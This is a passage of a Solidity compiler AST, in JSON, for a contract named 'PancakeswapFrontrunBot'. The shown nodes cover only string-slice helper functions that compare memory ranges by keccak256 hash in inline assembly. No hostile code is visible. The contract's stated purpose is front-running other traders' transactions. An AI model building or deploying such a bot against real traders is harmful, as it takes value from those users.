														"nodeType": "MemberAccess",
														"referencedDeclaration": 125,
														"src": "11589:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1181,
															"name": "needle",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1161,
															"src": "11602:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 1182,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 125,
														"src": "11602:11:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "11589:24:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1186,
												"nodeType": "IfStatement",
												"src": "11585:327:3",
												"trueBody": {
													"id": 1185,
													"nodeType": "Block",
													"src": "11615:297:3",
													"statements": [
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "11639:262:3",
																"statements": [
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "11658:27:3",
																		"value": {
																			"arguments": [
																				{
																					"name": "needle",
																					"nodeType": "YulIdentifier",
																					"src": "11678:6:3"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "11672:5:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11672:13:3"
																		},
																		"variables": [
																			{
																				"name": "length",
																				"nodeType": "YulTypedName",
																				"src": "11662:6:3",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "11703:37:3",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "self",
																							"nodeType": "YulIdentifier",
																							"src": "11728:4:3"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "11734:4:3",
																							"type": "",
																							"value": "0x20"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "11724:3:3"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11724:15:3"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "11718:5:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11718:22:3"
																		},
																		"variables": [
																			{
																				"name": "selfptr",
																				"nodeType": "YulTypedName",
																				"src": "11707:7:3",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "11758:41:3",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "needle",
																							"nodeType": "YulIdentifier",
																							"src": "11785:6:3"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "11793:4:3",
																							"type": "",
																							"value": "0x20"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "11781:3:3"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11781:17:3"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "11775:5:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11775:24:3"
																		},
																		"variables": [
																			{
																				"name": "needleptr",
																				"nodeType": "YulTypedName",
																				"src": "11762:9:3",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulAssignment",
																		"src": "11817:69:3",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "selfptr",
																							"nodeType": "YulIdentifier",
																							"src": "11839:7:3"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "11848:6:3"
																						}
																					],
																					"functionName": {
																						"name": "keccak256",
																						"nodeType": "YulIdentifier",
																						"src": "11829:9:3"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11829:26:3"
																				},
																				{
																					"arguments": [
																						{
																							"name": "needleptr",
																							"nodeType": "YulIdentifier",
																							"src": "11867:9:3"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "11878:6:3"
																						}
																					],
																					"functionName": {
																						"name": "keccak256",
																						"nodeType": "YulIdentifier",
																						"src": "11857:9:3"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11857:28:3"
																				}
																			],
																			"functionName": {
																				"name": "eq",
																				"nodeType": "YulIdentifier",
																				"src": "11826:2:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11826:60:3"
																		},
																		"variableNames": [
																			{
																				"name": "equal",
																				"nodeType": "YulIdentifier",
																				"src": "11817:5:3"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 1176,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11817:5:3",
																	"valueSize": 1
																},
																{
																	"declaration": 1161,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11678:6:3",
																	"valueSize": 1
																},
																{
																	"declaration": 1161,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11785:6:3",
																	"valueSize": 1
																},
																{
																	"declaration": 1159,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11728:4:3",
																	"valueSize": 1
																}
															],
															"id": 1184,
															"nodeType": "InlineAssembly",
															"src": "11630:271:3"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1187,
													"name": "equal",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1176,
													"src": "11929:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1203,
												"nodeType": "IfStatement",
												"src": "11925:101:3",
												"trueBody": {
													"id": 1202,
													"nodeType": "Block",
													"src": "11936:90:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1193,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1188,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1159,
																		"src": "11951:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																			"typeString": "struct PancakeswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 1190,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 123,
																	"src": "11951:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "-=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1191,
																		"name": "needle",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1161,
																		"src": "11964:6:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																			"typeString": "struct PancakeswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 1192,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 123,
																	"src": "11964:11:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "11951:24:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1194,
															"nodeType": "ExpressionStatement",
															"src": "11951:24:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1200,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1195,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1159,
																		"src": "11990:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																			"typeString": "struct PancakeswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 1197,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_ptr",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 125,
																	"src": "11990:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1198,
																		"name": "needle",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1161,
																		"src": "12003:6:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																			"typeString": "struct PancakeswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 1199,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 123,
																	"src": "12003:11:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "11990:24:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1201,
															"nodeType": "ExpressionStatement",
															"src": "11990:24:3"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1204,
													"name": "self",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1159,
													"src": "12046:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
														"typeString": "struct PancakeswapFrontrunBot.slice memory"
													}
												},
												"functionReturnParameters": 1165,
												"id": 1205,
												"nodeType": "Return",
												"src": "12039:11:3"
											}
										]
									},
									"documentation": null,
									"id": 1207,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "beyond",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1162,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1159,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1207,
												"src": "11389:17:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
													"typeString": "struct PancakeswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1158,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 126,
													"src": "11389:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$126_storage_ptr",
														"typeString": "struct PancakeswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1161,
												"mutability": "mutable",
												"name": "needle",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1207,
												"src": "11408:19:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
													"typeString": "struct PancakeswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1160,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 126,
													"src": "11408:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$126_storage_ptr",
														"typeString": "struct PancakeswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11388:40:3"
									},
									"returnParameters": {
										"id": 1165,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1164,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1207,
												"src": "11452:12:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
													"typeString": "struct PancakeswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1163,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 126,
													"src": "11452:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$126_storage_ptr",
														"typeString": "struct PancakeswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11451:14:3"
									},
									"scope": 1724,
									"src": "11373:685:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1328,
										"nodeType": "Block",
										"src": "12325:1309:3",
										"statements": [
											{
												"assignments": [
													1221
												],
												"declarations": [
													{
														"constant": false,
														"id": 1221,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1328,
														"src": "12336:8:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1220,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "12336:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1223,
												"initialValue": {
													"argumentTypes": null,
													"id": 1222,
													"name": "selfptr",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1211,
													"src": "12347:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "12336:18:3"
											},
											{
												"assignments": [
													1225
												],
												"declarations": [
													{
														"constant": false,
														"id": 1225,
														"mutability": "mutable",
														"name": "idx",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1328,
														"src": "12365:8:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1224,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "12365:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1226,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "12365:8:3"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1229,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1227,
														"name": "needlelen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1213,
														"src": "12391:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1228,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1209,
														"src": "12404:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "12391:20:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1323,
												"nodeType": "IfStatement",
												"src": "12387:1205:3",
												"trueBody": {
													"id": 1322,
													"nodeType": "Block",
													"src": "12413:1179:3",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1232,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1230,
																	"name": "needlelen",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1213,
																	"src": "12432:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 1231,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12445:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "12432:15:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"id": 1320,
																"nodeType": "Block",
																"src": "13102:479:3",
																"statements": [
																	{
																		"assignments": [
																			1289
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1289,
																				"mutability": "mutable",
																				"name": "hash",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1320,
																				"src": "13171:12:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1288,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "13171:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1290,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "13171:12:3"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "13211:43:3",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "13213:39:3",
																					"value": {
																						"arguments": [
																							{
																								"name": "needleptr",
																								"nodeType": "YulIdentifier",
																								"src": "13231:9:3"
																							},
																							{
																								"name": "needlelen",
																								"nodeType": "YulIdentifier",
																								"src": "13242:9:3"
																							}
																						],
																						"functionName": {
																							"name": "keccak256",
																							"nodeType": "YulIdentifier",
																							"src": "13221:9:3"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "13221:31:3"
																					},
																					"variableNames": [
																						{
																							"name": "hash",
																							"nodeType": "YulIdentifier",
																							"src": "13213:4:3"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1289,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "13213:4:3",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1213,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "13242:9:3",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1215,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "13231:9:3",
																				"valueSize": 1
																			}
																		],
																		"id": 1291,
																		"nodeType": "InlineAssembly",
																		"src": "13202:52:3"
																	},
																	{
																		"body": {
																			"id": 1318,
																			"nodeType": "Block",
																			"src": "13324:242:3",
																			"statements": [
																				{
																					"assignments": [
																						1305
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 1305,
																							"mutability": "mutable",
																							"name": "testHash",
																							"nodeType": "VariableDeclaration",
																							"overrides": null,
																							"scope": 1318,
																							"src": "13347:16:3",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							},
																							"typeName": {
																								"id": 1304,
																								"name": "bytes32",
																								"nodeType": "ElementaryTypeName",
																								"src": "13347:7:3",
																								"typeDescriptions": {
																									"typeIdentifier": "t_bytes32",
																									"typeString": "bytes32"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 1306,
																					"initialValue": null,
																					"nodeType": "VariableDeclarationStatement",
																					"src": "13347:16:3"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "13395:41:3",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "13397:37:3",
																								"value": {
																									"arguments": [
																										{
																											"name": "ptr",
																											"nodeType": "YulIdentifier",
																											"src": "13419:3:3"
																										},
																										{
																											"name": "needlelen",
																											"nodeType": "YulIdentifier",
																											"src": "13424:9:3"
																										}
																									],
																									"functionName": {
																										"name": "keccak256",
																										"nodeType": "YulIdentifier",
																										"src": "13409:9:3"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "13409:25:3"
																								},
																								"variableNames": [
																									{
																										"name": "testHash",
																										"nodeType": "YulIdentifier",
																										"src": "13397:8:3"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 1213,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13424:9:3",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1221,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13419:3:3",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1305,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13397:8:3",
																							"valueSize": 1
																						}
																					],
																					"id": 1307,
																					"nodeType": "InlineAssembly",
																					"src": "13386:50:3"
																				},
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_bytes32",
																							"typeString": "bytes32"
																						},
																						"id": 1310,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1308,
																							"name": "hash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1289,
																							"src": "13462:4:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "==",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 1309,
																							"name": "testHash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1305,
																							"src": "13470:8:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"src": "13462:16:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 1313,
																					"nodeType": "IfStatement",
																					"src": "13458:57:3",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"id": 1311,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1221,
																							"src": "13512:3:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 1219,
																						"id": 1312,
																						"nodeType": "Return",
																						"src": "13505:10:3"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 1316,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 1314,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1221,
																							"src": "13538:3:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 1315,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "13545:1:3",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "13538:8:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1317,
																					"nodeType": "ExpressionStatement",
																					"src": "13538:8:3"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1300,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1296,
																				"name": "idx",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1225,
																				"src": "13289:3:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 1299,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1297,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1209,
																					"src": "13296:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "-",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1298,
																					"name": "needlelen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1213,
																					"src": "13306:9:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "13296:19:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "13289:26:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 1319,
																		"initializationExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 1294,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 1292,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1225,
																					"src": "13280:3:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "30",
																					"id": 1293,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "13286:1:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				},
																				"src": "13280:7:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 1295,
																			"nodeType": "ExpressionStatement",
																			"src": "13280:7:3"
																		},
																		"loopExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 1302,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "UnaryOperation",
																				"operator": "++",
																				"prefix": false,
																				"src": "13317:5:3",
																				"subExpression": {
																					"argumentTypes": null,
																					"id": 1301,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1225,
																					"src": "13317:3:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 1303,
																			"nodeType": "ExpressionStatement",
																			"src": "13317:5:3"
																		},
																		"nodeType": "ForStatement",
																		"src": "13275:291:3"
																	}
																]
															},
															"id": 1321,
															"nodeType": "IfStatement",
															"src": "12428:1153:3",
															"trueBody": {
																"id": 1287,
																"nodeType": "Block",
																"src": "12449:647:3",
																"statements": [
																	{
																		"assignments": [
																			1234
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1234,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1287,
																				"src": "12468:12:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1233,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12468:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1251,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1249,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "~",
																					"prefix": true,
																					"src": "12491:34:3",
																					"subExpression": {
																						"argumentTypes": null,
																						"components": [
																							{
																								"argumentTypes": null,
																								"commonType": {
